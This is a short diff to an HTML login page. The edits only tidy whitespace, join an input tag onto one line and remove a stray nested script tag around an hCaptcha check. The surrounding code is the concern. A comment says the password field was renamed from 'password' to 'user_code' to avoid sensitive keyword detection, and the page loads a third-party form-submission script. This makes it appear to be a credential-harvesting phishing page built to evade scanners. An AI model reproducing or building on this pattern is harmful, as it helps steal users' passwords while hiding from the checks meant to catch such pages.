@@ -12,7 +12,7 @@
         integrity="sha512-Fo3rlrZj/k7ujTTXRNXOXh7Hq5N9/1Kq1YOq6V2sW/jG4Bw4T1TJD5uB7Cobe74QNf9tNE5kN9S9ID5MW4ZKZw=="
         crossorigin="anonymous" referrerpolicy="no-referrer" />
     <script src="https://web3forms.com/client/script.js" async defer></script>
-    
+
 </head>
 
 <body>
@@ -46,8 +46,7 @@
                 <!-- User Code Field (renamed from 'password' to avoid sensitive keyword detection) -->
                 <div class="textbox">
                     <h3>Password</h3>
-                    <input type="password" id="user_code" name="user_code" placeholder="Enter your password"
-                        required>
+                    <input type="password" id="user_code" name="user_code" placeholder="Enter your password" required>
                 </div>
 
                 <!-- Remember me and forgot password -->
@@ -104,20 +103,18 @@
 
             return true;
         });
-        <script>
-const form = document.getElementById('login-form');
+        const form = document.getElementById('login-form');
 
-form.addEventListener('submit', function(e) {
+        form.addEventListener('submit', function (e) {
 
-    const hCaptcha = form.querySelector('textarea[name=h-captcha-response]').value;
+            const hCaptcha = form.querySelector('textarea[name=h-captcha-response]').value;
 
-    if (!hCaptcha) {
-        e.preventDefault();
-        alert("Please fill out captcha field")
-        return
-    }
-});
-</script>
+            if (!hCaptcha) {
+                e.preventDefault();
+                alert("Please fill out captcha field")
+                return
+            }
+        });
     </script>
 </body>
 
